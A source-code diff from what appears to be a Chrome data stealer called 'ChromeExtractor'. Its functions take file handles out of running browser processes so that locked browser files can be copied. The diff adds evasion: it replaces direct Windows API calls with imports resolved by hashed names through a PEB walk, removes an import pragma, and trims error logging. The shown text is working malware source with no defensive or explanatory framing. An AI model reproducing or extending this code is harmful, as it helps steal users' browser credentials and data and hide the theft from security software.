@@ -13,8 +13,6 @@
 #include <set>
 #include <cctype>
 
-#pragma comment(lib, "kernel32.lib")
-
 using namespace ChromeExtractor::Syscalls;
 
 // ── Handle-duplication helpers ────────────────────────────────────────────────
@@ -47,12 +45,29 @@ static DWORD WINAPI PathQueryThreadPW(LPVOID p) {
 }
 
 static bool GetPathTimeoutPW(HANDLE h, wchar_t* out, int max) {
+    using FnCT  = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
+    using FnWFS = DWORD(WINAPI*)(HANDLE, DWORD);
+    using FnTT  = BOOL(WINAPI*)(HANDLE, DWORD);
+    using FnCH  = BOOL(WINAPI*)(HANDLE);
+    constexpr DWORD kKB  = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
+    constexpr DWORD kCT  = ChromeExtractor::Syscalls::PebHash("CreateThread");
+    constexpr DWORD kWFS = ChromeExtractor::Syscalls::PebHash("WaitForSingleObject");
+    constexpr DWORD kTT  = ChromeExtractor::Syscalls::PebHash("TerminateThread");
+    constexpr DWORD kCH  = ChromeExtractor::Syscalls::PebHash("CloseHandle");
+    void* hm = ChromeExtractor::Syscalls::PebGetModule(kKB);
+    if (!hm) return false;
+    auto pCT  = reinterpret_cast<FnCT> (ChromeExtractor::Syscalls::PebGetExport(hm, kCT));
+    auto pWFS = reinterpret_cast<FnWFS>(ChromeExtractor::Syscalls::PebGetExport(hm, kWFS));
+    auto pTT  = reinterpret_cast<FnTT> (ChromeExtractor::Syscalls::PebGetExport(hm, kTT));
+    auto pCH  = reinterpret_cast<FnCH> (ChromeExtractor::Syscalls::PebGetExport(hm, kCH));
+    if (!pCT || !pWFS) return false;
+
     PathQueryPW q = { h, {} };
-    HANDLE t = CreateThread(nullptr, 0, PathQueryThreadPW, &q, 0, nullptr);
+    HANDLE t = pCT(nullptr, 0, PathQueryThreadPW, &q, 0, nullptr);
     if (!t) return false;
-    bool ok = (WaitForSingleObject(t, 500) == WAIT_OBJECT_0);
-    if (!ok) TerminateThread(t, 0);
-    CloseHandle(t);
+    bool ok = (pWFS(t, 500) == WAIT_OBJECT_0);
+    if (!ok && pTT) pTT(t, 0);
+    if (pCH) pCH(t);
     if (ok && q.path[0]) { wcsncpy_s(out, max, q.path, _TRUNCATE); return true; }
     return false;
 }
@@ -75,16 +90,44 @@ static HANDLE StealFileHandlePW(const std::string& target_path, const char* brow
     static auto NtQSI = PebResolve<pfnNtQSI_PW>(H_NTDLL, H_NtQSI);
     if (!NtQSI || !browser_exe) return INVALID_HANDLE_VALUE;
 
+    using FnOP  = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
+    using FnDH  = BOOL(WINAPI*)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
+    using FnGCP = DWORD(WINAPI*)();
+    using FnGCPID = DWORD(WINAPI*)();
+    using FnCH  = BOOL(WINAPI*)(HANDLE);
+    using FnCFW = HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+    using FnSFP = DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD);
+    constexpr DWORD kKB    = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
+    constexpr DWORD kOP    = ChromeExtractor::Syscalls::PebHash("OpenProcess");
+    constexpr DWORD kDH    = ChromeExtractor::Syscalls::PebHash("DuplicateHandle");
+    constexpr DWORD kGCP   = ChromeExtractor::Syscalls::PebHash("GetCurrentProcess");
+    constexpr DWORD kGCPID = ChromeExtractor::Syscalls::PebHash("GetCurrentProcessId");
+    constexpr DWORD kCH    = ChromeExtractor::Syscalls::PebHash("CloseHandle");
+    constexpr DWORD kCFW   = ChromeExtractor::Syscalls::PebHash("CreateFileW");
+    constexpr DWORD kSFP   = ChromeExtractor::Syscalls::PebHash("SetFilePointer");
+    void* hkb = ChromeExtractor::Syscalls::PebGetModule(kKB);
+    if (!hkb) return INVALID_HANDLE_VALUE;
+    auto pOP    = reinterpret_cast<FnOP>   (ChromeExtractor::Syscalls::PebGetExport(hkb, kOP));
+    auto pDH    = reinterpret_cast<FnDH>   (ChromeExtractor::Syscalls::PebGetExport(hkb, kDH));
+    auto pGCP   = reinterpret_cast<FnGCP>  (ChromeExtractor::Syscalls::PebGetExport(hkb, kGCP));
+    auto pGCPID = reinterpret_cast<FnGCPID>(ChromeExtractor::Syscalls::PebGetExport(hkb, kGCPID));
+    auto pCH    = reinterpret_cast<FnCH>   (ChromeExtractor::Syscalls::PebGetExport(hkb, kCH));
+    auto pCFW   = reinterpret_cast<FnCFW>  (ChromeExtractor::Syscalls::PebGetExport(hkb, kCFW));
+    auto pSFP   = reinterpret_cast<FnSFP>  (ChromeExtractor::Syscalls::PebGetExport(hkb, kSFP));
+    if (!pOP || !pDH || !pGCP || !pCH) return INVALID_HANDLE_VALUE;
+
     wchar_t canon[MAX_PATH] = {};
     {
         wchar_t wide[MAX_PATH];
         MultiByteToWideChar(CP_ACP, 0, target_path.c_str(), -1, wide, MAX_PATH);
-        HANDLE hTmp = CreateFileW(wide, 0,
-            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hTmp != INVALID_HANDLE_VALUE) {
-            GetFinalPathNameByHandleW(hTmp, canon, MAX_PATH, VOLUME_NAME_NT);
-            CloseHandle(hTmp);
+        if (pCFW) {
+            HANDLE hTmp = pCFW(wide, 0,
+                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+            if (hTmp != INVALID_HANDLE_VALUE) {
+                GetFinalPathNameByHandleW(hTmp, canon, MAX_PATH, VOLUME_NAME_NT);
+                pCH(hTmp);
+            }
         }
         if (!canon[0]) return INVALID_HANDLE_VALUE;
     }
@@ -104,10 +147,11 @@ static HANDLE StealFileHandlePW(const std::string& target_path, const char* brow
     if (st != 0) return INVALID_HANDLE_VALUE;
 
     auto* info = (SYS_HANDLE_INFO_PW*)buf.data();
-    DWORD my_pid = GetCurrentProcessId();
+    DWORD my_pid = pGCPID ? pGCPID() : 0;
     HANDLE hProc = INVALID_HANDLE_VALUE;
     DWORD  cur_pid = 0;
     HANDLE result = INVALID_HANDLE_VALUE;
+    HANDLE hSelf = pGCP();
 
     for (ULONG i = 0; i < info->NumberOfHandles && result == INVALID_HANDLE_VALUE; i++) {
         auto& e = info->Handles[i];
@@ -115,57 +159,80 @@ static HANDLE StealFileHandlePW(const std::string& target_path, const char* brow
         if (pid == my_pid) continue;
         if (!std::binary_search(pids.begin(), pids.end(), pid)) continue;
         if (pid != cur_pid) {
-            if (hProc != INVALID_HANDLE_VALUE) CloseHandle(hProc);
-            hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
+            if (hProc != INVALID_HANDLE_VALUE) pCH(hProc);
+            hProc = pOP(PROCESS_DUP_HANDLE, FALSE, pid);
             cur_pid = pid;
         }
         if (!hProc || hProc == INVALID_HANDLE_VALUE) continue;
 
         HANDLE dup = NULL;
-        if (!DuplicateHandle(hProc, (HANDLE)(ULONG_PTR)e.HandleValue,
-            GetCurrentProcess(), &dup, GENERIC_READ, FALSE, 0)) continue;
+        if (!pDH(hProc, (HANDLE)(ULONG_PTR)e.HandleValue,
+            hSelf, &dup, GENERIC_READ, FALSE, 0)) continue;
 
         wchar_t path[MAX_PATH] = {};
         bool matched = GetPathTimeoutPW(dup, path, MAX_PATH) && (_wcsicmp(path, canon) == 0);
         if (matched) {
-            SetFilePointer(dup, 0, nullptr, FILE_BEGIN);
+            if (pSFP) pSFP(dup, 0, nullptr, FILE_BEGIN);
             result = dup;
         }
         else {
-            CloseHandle(dup);
+            pCH(dup);
         }
     }
-    if (hProc != INVALID_HANDLE_VALUE) CloseHandle(hProc);
+    if (hProc != INVALID_HANDLE_VALUE) pCH(hProc);
     return result;
 }
 
 static bool CopyLockedFilePW(const std::string& src, const std::string& dst,
     const char* browser_exe = nullptr) {
-    HANDLE hSrc = CreateFileA(src.c_str(), GENERIC_READ,
+    using FnCFA = HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+    using FnRF  = BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
+    using FnWF  = BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
+    using FnCH  = BOOL(WINAPI*)(HANDLE);
+    using FnDFA = BOOL(WINAPI*)(LPCSTR);
+    using FnGLE = DWORD(WINAPI*)();
+    constexpr DWORD kKB  = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
+    constexpr DWORD kCFA = ChromeExtractor::Syscalls::PebHash("CreateFileA");
+    constexpr DWORD kRF  = ChromeExtractor::Syscalls::PebHash("ReadFile");
+    constexpr DWORD kWF  = ChromeExtractor::Syscalls::PebHash("WriteFile");
+    constexpr DWORD kCH  = ChromeExtractor::Syscalls::PebHash("CloseHandle");
+    constexpr DWORD kDFA = ChromeExtractor::Syscalls::PebHash("DeleteFileA");
+    constexpr DWORD kGLE = ChromeExtractor::Syscalls::PebHash("GetLastError");
+    void* hkb = ChromeExtractor::Syscalls::PebGetModule(kKB);
+    if (!hkb) return false;
+    auto pCFA = reinterpret_cast<FnCFA>(ChromeExtractor::Syscalls::PebGetExport(hkb, kCFA));
+    auto pRF  = reinterpret_cast<FnRF> (ChromeExtractor::Syscalls::PebGetExport(hkb, kRF));
+    auto pWF  = reinterpret_cast<FnWF> (ChromeExtractor::Syscalls::PebGetExport(hkb, kWF));
+    auto pCH  = reinterpret_cast<FnCH> (ChromeExtractor::Syscalls::PebGetExport(hkb, kCH));
+    auto pDFA = reinterpret_cast<FnDFA>(ChromeExtractor::Syscalls::PebGetExport(hkb, kDFA));
+    auto pGLE = reinterpret_cast<FnGLE>(ChromeExtractor::Syscalls::PebGetExport(hkb, kGLE));
+    if (!pCFA || !pRF || !pWF || !pCH) return false;
+
+    HANDLE hSrc = pCFA(src.c_str(), GENERIC_READ,
         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
         nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (hSrc == INVALID_HANDLE_VALUE && GetLastError() == ERROR_SHARING_VIOLATION) {
+    if (hSrc == INVALID_HANDLE_VALUE && pGLE && pGLE() == ERROR_SHARING_VIOLATION) {
         g_logger.Debug("Sharing violation on " + src + ", attempting handle steal");
         hSrc = StealFileHandlePW(src, browser_exe);
     }
     if (hSrc == INVALID_HANDLE_VALUE) {
-        g_logger.Debug("Cannot open source: " + src + " (err=" + std::to_string(GetLastError()) + ")");
+        g_logger.Debug("Cannot open source: " + src);
         return false;
     }
 
-    HANDLE hDst = CreateFileA(dst.c_str(), GENERIC_WRITE, 0,
+    HANDLE hDst = pCFA(dst.c_str(), GENERIC_WRITE, 0,
         nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
     if (hDst == INVALID_HANDLE_VALUE) {
         g_logger.Debug("Cannot create temp: " + dst);
-        CloseHandle(hSrc);
+        pCH(hSrc);
         return false;
     }
 
     char buf[65536]; DWORD rd, wr; bool ok = true;
-    while (ok && ReadFile(hSrc, buf, sizeof(buf), &rd, nullptr) && rd > 0)
-        ok = WriteFile(hDst, buf, rd, &wr, nullptr) && (wr == rd);
-    CloseHandle(hSrc); CloseHandle(hDst);
-    if (!ok) DeleteFileA(dst.c_str());
+    while (ok && pRF(hSrc, buf, sizeof(buf), &rd, nullptr) && rd > 0)
+        ok = pWF(hDst, buf, rd, &wr, nullptr) && (wr == rd);
+    pCH(hSrc); pCH(hDst);
+    if (!ok && pDFA) pDFA(dst.c_str());
     return ok;
 }
 
